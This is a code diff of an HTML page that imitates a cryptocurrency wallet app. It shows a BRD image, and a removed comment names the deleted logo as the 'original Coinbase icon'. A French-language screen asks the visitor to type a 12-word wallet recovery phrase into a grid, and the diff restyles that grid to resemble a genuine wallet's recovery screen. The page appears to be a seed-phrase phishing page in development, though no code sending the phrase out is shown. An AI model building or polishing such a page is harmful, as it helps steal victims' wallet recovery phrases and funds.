@@ -13,6 +13,7 @@
             --text-white: #ffffff;
             --text-secondary: #b0b0cc;
             --grid-border: rgba(255, 255, 255, 0.1);
+            --input-bg: #2a2a4a;
         }
 
         * {
@@ -32,10 +33,9 @@
             margin: 0;
         }
 
-        /* حاوية ديناميكية توازن بين الحاسوب والهاتف */
         .container {
             width: 100%;
-            max-width: 500px; /* حجم مثالي للحاسوب لتبدو كالتطبيق */
+            max-width: 500px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -64,38 +64,12 @@
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* الشاشة الأولى */
         .logo-area {
             display: flex;
             flex-direction: column;
             align-items: center;
             margin-top: 20px;
             margin-bottom: 40px;
-        }
-
-        /* أيقونة Coinbase الأصلية */
-        .cb-logo {
-            width: 85px;
-            height: 85px;
-            background-color: #0052ff;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-
-        .cb-logo-inner {
-            width: 32px;
-            height: 32px;
-            border: 6px solid white;
-            border-radius: 5px;
-        }
-
-        .arrow-sep {
-            font-size: 22px;
-            color: var(--text-secondary);
-            margin: 5px 0;
         }
 
         .brd-main-img {
@@ -140,54 +114,115 @@
         .btn-primary { background-color: var(--btn-blue); color: white; }
         .btn-secondary { background-color: var(--btn-gray); color: white; }
 
-        /* الشاشة الثانية (شبكة الأرقام المطابقة للحقيقة) */
-        .header {
+        /* ========== الصفحة الثانية - التعديلات الجديدة ========== */
+        .recovery-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 50px;
+            margin-bottom: 40px;
+            padding-top: 10px;
         }
 
-        .back-icon { font-size: 30px; cursor: pointer; }
-        .info-icon { 
-            width: 25px; height: 25px; 
-            border: 2px solid white; 
-            border-radius: 50%; 
-            display: flex; justify-content: center; align-items: center;
-            font-size: 14px;
+        .back-arrow {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-arrow svg {
+            width: 20px;
+            height: 20px;
+            stroke: white;
+            stroke-width: 2;
+            fill: none;
+        }
+
+        .help-icon {
+            width: 24px;
+            height: 24px;
+            border: 2px solid white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .recovery-title {
+            font-size: 26px;
+            font-weight: 600;
+            text-align: left;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .recovery-subtitle {
+            color: var(--text-secondary);
+            text-align: left;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 30px;
         }
 
         .recovery-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
             width: 100%;
-            border: 1px solid var(--grid-border);
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.03);
-            overflow: hidden;
         }
 
         .grid-item {
-            border: 0.5px solid var(--grid-border);
-            height: 80px;
-            padding: 10px;
+            background-color: var(--input-bg);
+            border-radius: 8px;
+            height: 56px;
             display: flex;
-            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
         }
 
         .item-num {
-            font-size: 12px;
             color: var(--text-secondary);
-            margin-bottom: 5px;
+            font-size: 16px;
+            font-weight: 500;
         }
 
         .item-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: transparent;
             border: none;
             color: white;
             font-size: 15px;
-            width: 100%;
+            text-align: center;
             outline: none;
+            opacity: 0;
+        }
+
+        .item-input:focus {
+            opacity: 1;
+            background-color: var(--input-bg);
+            border-radius: 8px;
+        }
+
+        .item-input:focus + .item-num {
+            display: none;
+        }
+
+        .item-input:not(:placeholder-shown) {
+            opacity: 1;
+        }
+
+        .item-input:not(:placeholder-shown) + .item-num {
+            display: none;
         }
     </style>
 </head>
@@ -195,10 +230,9 @@
 
     <div class="container">
         
+        <!-- الصفحة الأولى - بدون تغيير -->
         <div id="p1" class="page active">
             <div class="logo-area">
-                <div class="cb-logo"><div class="cb-logo-inner"></div></div>
-                <div class="arrow-sep">↑</div>
                 <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
             </div>
 
@@ -212,34 +246,37 @@
             </div>
         </div>
 
+        <!-- الصفحة الثانية - الهيكل الجديد -->
         <div id="p2" class="page">
-            <div class="header">
-                <div class="back-icon" onclick="showPage('p1')">←</div>
-                <div class="info-icon">?</div>
+            <div class="recovery-header">
+                <div class="back-arrow" onclick="showPage('p1')">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M19 12H5M12 19l-7-7 7-7"/>
+                    </svg>
+                </div>
+                <div class="help-icon">?</div>
             </div>
 
-            <h1 style="text-align: left; font-size: 24px;">Récupérer votre portefeuille</h1>
-            <p class="sub-text" style="text-align: left; margin-bottom: 30px;">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
+            <h1 class="recovery-title">Récupérer votre portefeuille</h1>
+            <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
 
             <div class="recovery-grid" id="mainGrid">
-                </div>
+            </div>
         </div>
 
     </div>
 
     <script>
-        // دالة التنقل
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById(id).classList.add('active');
         }
 
-        // بناء شبكة الأرقام بدقة
         const grid = document.getElementById('mainGrid');
         for (let i = 1; i <= 12; i++) {
             const div = document.createElement('div');
             div.className = 'grid-item';
-            div.innerHTML = `<span class="item-num">${i}</span><input type="text" class="item-input" spellcheck="false">`;
+            div.innerHTML = `<input type="text" class="item-input" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
             grid.appendChild(div);
         }
     </script>
